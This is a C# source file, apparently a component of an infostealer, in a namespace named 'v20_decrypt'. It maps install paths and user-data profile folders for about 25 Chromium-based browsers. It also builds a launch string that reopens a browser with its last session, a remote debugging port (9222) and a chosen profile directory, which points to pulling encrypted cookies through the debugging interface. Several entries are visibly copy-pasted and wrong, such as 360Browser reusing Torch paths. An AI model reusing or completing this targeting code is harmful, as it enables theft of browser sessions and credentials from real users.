using System;
using System.Collections.Generic;

namespace v20_decrypt
{
    internal class PathsCV20
    {
        private const int DEBUG_PORT = 9222;
        private static readonly string none = "None";
        public static string commandT = $"--restore-last-session --remote-debugging-port={DEBUG_PORT} --user-data-dir=";
        private static readonly string LOCAL_APP_DATA = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private static readonly string APP_DATA = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);


        public static readonly Dictionary<string, Dictionary<string, string>> PATHS = new Dictionary<string, Dictionary<string, string>>()
        {
            {
            "Google", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files\Google\Chrome\Application\chrome.exe" },
                { "bin2", $@"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" },
                { "bin3", $@"{LOCAL_APP_DATA}\Google\Chrome\Application\chrome.exe" }
            }
            },
            {
            "Edge", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" },
                { "bin2", $@"C:\Program Files\Microsoft\Edge\Application\msedge.exe" },
                { "bin3", $"{none}" }
            }
            },
            {
            "Brave", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe" },
                { "bin2", $@"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe" },
                { "bin3", $@"{LOCAL_APP_DATA}\BraveSoftware\Brave-Browser\Application\brave.exe" }
            }
            },
            {
            "Opera", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files (x86)\Opera\opera.exe" },
                { "bin2", $@"{LOCAL_APP_DATA}\Programs\Opera\opera.exe" },
                { "bin3", $@"C:\Program Files\Opera\opera.exe" }
            }
            },
            {
            "Yandex", new Dictionary<string, string>
            {
                { "bin1", $@"{LOCAL_APP_DATA}\Yandex\YandexBrowser\Application\browser.exe" },
                { "bin2", $@"C:\Program Files\Yandex\YandexBrowser\Application\browser.exe" },
                { "bin3", $"{none}" }
            }
            },
            {
            "Chromium", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files\Chromium\Application\chrome.exe" },
                { "bin2", $@"C:\Program Files (x86)\Chromium\Application\chrome.exe" },
                { "bin3", $"{none}" }
            }
            },
            {
            "Opera GX", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files (x86)\Opera GX\opera.exe" },
                { "bin2", $@"{LOCAL_APP_DATA}\Programs\Opera GX\opera.exe" },
                { "bin3", $@"C:\Program Files\Opera GX\opera.exe" }
            }
            },
            {
            "Dragon", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files\Comodo\Dragon\dragon.exe" },
                { "bin2", $@"C:\Program Files (x86)\Comodo\Dragon\dragon.exe" },
                { "bin3", $@"C:\Program Files\Comodo\Comodo Dragon\dragon.exe" }
            }
            },
            {
            "EpicPrivacy", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files\Epic Privacy Browser\epic.exe" },
                { "bin2", $@"C:\Program Files (x86)\Epic Privacy Browser\epic.exe" },
                { "bin3", $@"{LOCAL_APP_DATA}\Epic Privacy Browser\Application\epic.exe" }
            }
            },
            {
            "Iridium", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files\Iridium Browser\iridium.exe" },
                { "bin2", $@"C:\Program Files (x86)\Iridium Browser\iridium.exe" },
                { "bin3", $@"{none}" }
            }
            },
            {
            "Slimjet", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files\Slimjet\slimjet.exe" },
                { "bin2", $@"C:\Program Files (x86)\Slimjet\slimjet.exe" },
                { "bin3", $@"{LOCAL_APP_DATA}\Slimjet\slimjet.exe" }
            }
            },
            {
            "UR-Browser", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files\UR Browser\application\ur.exe" },
                { "bin2", $@"C:\Program Files (x86)\UR Browser\application\ur.exe" },
                { "bin3", $@"{none}" }
            }
            },
            {
            "Vivaldi", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files\Vivaldi\Application\vivaldi.exe" },
                { "bin2", $@"C:\Program Files (x86)\Vivaldi\Application\vivaldi.exe" },
                { "bin3", $@"{LOCAL_APP_DATA}\Vivaldi\Application\vivaldi.exe" }
            }
            },
            {
            "Google(x86)", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" },
                { "bin2", $@"C:\Program Files\Vivaldi\Application\vivaldi.exe" },
                { "bin3", $@"{none}" }
            }
            },
            {
            "MapleStudio", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files\Maple 20XX\bin.X86_64\maplew.exe" },
                { "bin2", $@"C:\Program Files\Maple 20XX\bin\maple.exe" },
                { "bin3", $@"C:\Program Files\Maple 20XX\bin.X64\maplew.exe" }
            }
            },
            {
            "7Star", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files\7Star Browser\7star.exe" },
                { "bin2", $@"C:\Program Files (x86)\7Star Browser\7star.exe" },
                { "bin3", $@"{none}" }
            }
            },
            {
            "CentBrowser", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files\CentBrowser\chrome.exe" },
                { "bin2", $@"C:\Program Files (x86)\CentBrowser\chrome.exe" },
                { "bin3", $@"{none}" }
            }
            },
            {
            "Chedot", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files\Chedot\chrome.exe" },
                { "bin2", $@"C:\Program Files (x86)\Chedot\chrome.exe" },
                { "bin3", $@"{LOCAL_APP_DATA}\Chedot\chrome.exe" }
            }
            },
            {
            "Kometa", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files\Kometa\kometa.exe" },
                { "bin2", $@"C:\Program Files (x86)\Kometa\kometa.exe" },
                { "bin3", $@"{LOCAL_APP_DATA}\Kometa\kometa.exe" }
            }
            },
            {
            "Elements Browser", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files\Elements Browser\elements.exe" },
                { "bin2", $@"C:\Program Files (x86)\Elements Browser\elements.exe" },
                { "bin3", $@"{none}" }
            }
            },
            {
            "Uran", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files\Uran Browser\uran.exe" },
                { "bin2", $@"C:\Program Files (x86)\Uran Browser\uran.exe" },
                { "bin3", $@"{LOCAL_APP_DATA}\Uran Browser\application\uran.exe" }
            }
            },
            {
            "Amigo", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files\Amigo\amigo.exe" },
                { "bin2", $@"C:\Program Files (x86)\Amigo\amigo.exe" },
                { "bin3", $@"{LOCAL_APP_DATA}\Amigo\amigo.exe" }
            }
            },
            {
            "Atom", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files\Mail.Ru\Atom\application\atom.exe" },
                { "bin2", $@"C:\Program Files\VK\VKBrowser\application\vk.exe" },
                { "bin3", $@"C:\Program Files (x86)\Mail.Ru\Atom\application\atom.exe" }
            }
            },
            {
            "Torch", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files\Torch\torch.exe" },
                { "bin2", $@"C:\Program Files (x86)\Torch\torch.exe" },
                { "bin3", $@"{LOCAL_APP_DATA}\Torch\torch.exe" }
            }
            },
            {
            "360Browser", new Dictionary<string, string>
            {
                { "bin1", $@"C:\Program Files\Torch\torch.exe" },
                { "bin2", $@"C:\Program Files (x86)\Torch\torch.exe" },
                { "bin3", $@"{LOCAL_APP_DATA}\Torch\torch.exe" }
            }
            },
        };

        public static readonly Dictionary<string, string> pathsBRWSRs = new Dictionary<string, string>
            {
                { "Google", Path.Combine(LOCAL_APP_DATA, "Google", "Chrome", "User Data") },
                { "Yandex", Path.Combine(LOCAL_APP_DATA, "Yandex", "YandexBrowser", "User Data") },
                { "Edge", Path.Combine(LOCAL_APP_DATA, "Microsoft", "Edge", "User Data") },
                { "Opera", Path.Combine(APP_DATA, "Opera Software", "Opera Stable") },
                { "Opera GX", Path.Combine(APP_DATA, "Opera Software", "Opera GX Stable") },
                { "Brave", Path.Combine(LOCAL_APP_DATA, "BraveSoftware", "Brave-Browser", "User Data") },
                { "Chromium", Path.Combine(LOCAL_APP_DATA, "Chromium", "User Data") },
                { "Dragon", Path.Combine(LOCAL_APP_DATA, "Comodo", "Dragon", "User Data") },
                { "EpicPrivacy", Path.Combine(LOCAL_APP_DATA, "Epic Privacy Browser", "User Data") },
                { "Iridium", Path.Combine(LOCAL_APP_DATA, "Iridium", "User Data") },
                { "Slimjet", Path.Combine(LOCAL_APP_DATA, "Slimjet", "User Data") },
                { "UR-Browser", Path.Combine(LOCAL_APP_DATA, "UR Browser", "User Data") },
                { "Vivaldi", Path.Combine(LOCAL_APP_DATA, "Vivaldi", "User Data") },
                { "Google(x86)", Path.Combine(LOCAL_APP_DATA, "Google(x86)", "Chrome", "User Data") },
                { "MapleStudio", Path.Combine(LOCAL_APP_DATA, "MapleStudio", "ChromePlus", "User Data") },
                { "7Star", Path.Combine(LOCAL_APP_DATA, "7Star", "7Star", "User Data") },
                { "CentBrowser", Path.Combine(LOCAL_APP_DATA, "CentBrowser", "User Data") },
                { "Chedot", Path.Combine(LOCAL_APP_DATA, "Chedot", "User Data") },
                { "Kometa", Path.Combine(LOCAL_APP_DATA, "Kometa", "User Data") },
                { "Elements Browser", Path.Combine(LOCAL_APP_DATA, "Elements Browser", "User Data") },
                { "Uran", Path.Combine(LOCAL_APP_DATA, "uCozMedia", "Uran", "User Data") },
                { "Amigo", Path.Combine(LOCAL_APP_DATA, "Amigo", "User", "User Data") },
                { "Atom", Path.Combine(LOCAL_APP_DATA, "Mail.Ru", "Atom", "User Data") },
                { "Torch", Path.Combine(LOCAL_APP_DATA, "Torch", "User Data") },
                { "360Browser", Path.Combine(LOCAL_APP_DATA, "360Browser", "Browser", "User Data")}
            };
    }
}
